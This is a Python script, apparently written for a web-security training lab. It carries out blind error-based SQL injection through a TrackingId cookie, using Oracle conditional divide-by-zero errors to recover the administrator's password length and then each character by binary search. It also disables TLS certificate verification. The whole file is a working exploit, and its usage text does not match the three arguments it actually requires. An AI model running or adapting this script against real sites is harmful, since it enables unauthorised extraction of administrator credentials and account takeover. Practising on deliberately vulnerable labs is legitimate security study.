import sys
import requests
import urllib3
import urllib.parse

url = sys.argv[1]
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def request(sqli_payload):
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {'TrackingId': 'kWxUQuwxPIq96rhU' + sqli_payload_encoded, 'session': '6qGvzMC72mMP95WZ13hsF2qWaP0RW0xq'}
    r = requests.get(url, cookies=cookies, verify=False)
    return r

def password_len(a, b):
    for x in range(a,b):
        sqli_payload = "'||(SELECT CASE WHEN((select length(password) from users where username ='administrator') = %s) THEN TO_CHAR(0/1) ELSE TO_CHAR(1/0) END FROM dual)||'" % (x)
        r = request(sqli_payload)
        if r.status_code == 200:
            print("Length is: ", x)
            return x
        else:
            sys.stdout.write('\r' + str(x))
        

def sqli_password(a,b):
    l = password_len(a,b)
    password_extracted = ""
    for i in range(1,l+1):
        c = 32
        d = 126
        while True:
            x = int((c+d)/2)
            sqli_payload = "'||(SELECT CASE WHEN((SELECT ascii(substr(password,%s,1)) from users where username ='administrator') = '%s') THEN TO_CHAR(0/1) ELSE TO_CHAR(1/0) END FROM dual)||'" % (i,x) 
            r = request(sqli_payload)
            sp = "'||(SELECT CASE WHEN((SELECT ascii(substr(password,%s,1)) from users where username ='administrator') > '%s') THEN TO_CHAR(0/1) ELSE TO_CHAR(1/0) END FROM dual)||'" % (i,x)
            r1 = request(sp)
            if r.status_code == 200:
                password_extracted += chr(x)
                sys.stdout.write('\r'+ password_extracted)
                break
            else:
                sys.stdout.write('\r'+ password_extracted + chr(x))
            if r1.status_code == 200:
                c = x
            else:
                d = x
def main():
    if len(sys.argv) !=4:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    a = int(sys.argv[2])
    b = int(sys.argv[3])
    print("(+) Retreiving administrator password...")
    sqli_password(a,b)


if __name__ == "__main__":
    main()